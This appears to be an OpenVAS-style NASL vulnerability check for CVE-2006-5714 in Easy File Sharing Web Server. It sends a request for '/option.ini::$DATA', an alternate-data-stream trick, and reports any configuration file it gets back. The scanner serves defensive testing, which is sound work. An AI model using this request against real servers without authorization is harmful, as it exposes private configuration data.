if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80055" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2006-5714" );
	script_bugtraq_id( 20823 );
	script_xref( name: "OSVDB", value: "30150" );
	script_name( "Easy File Sharing Web Server Information Disclosure" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2008 Justin Seitz" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "EasyFileSharingWebServer/banner" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The version of Easy File Sharing Web Server that is installed on the remote host fails
  to restrict access to files via alternative data streams. By passing a specially-crafted request to the web server, an
  attacker may be able to access privileged information." );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/2690" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("url_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: Easy File Sharing Web Server" )){
	exit( 0 );
}
attackreq = http_get( item: urlencode( str: "/option.ini::$DATA" ), port: port );
attackres = http_keepalive_send_recv( port: port, data: attackreq, bodyonly: TRUE );
if(!attackres){
	exit( 0 );
}
if(ContainsString( attackres, "[Server]" )){
	info = NASLString( "Here are the contents of the 'options.ini' configuration file from the remote host: \\n\\n", attackres );
	security_message( data: info, port: port );
}

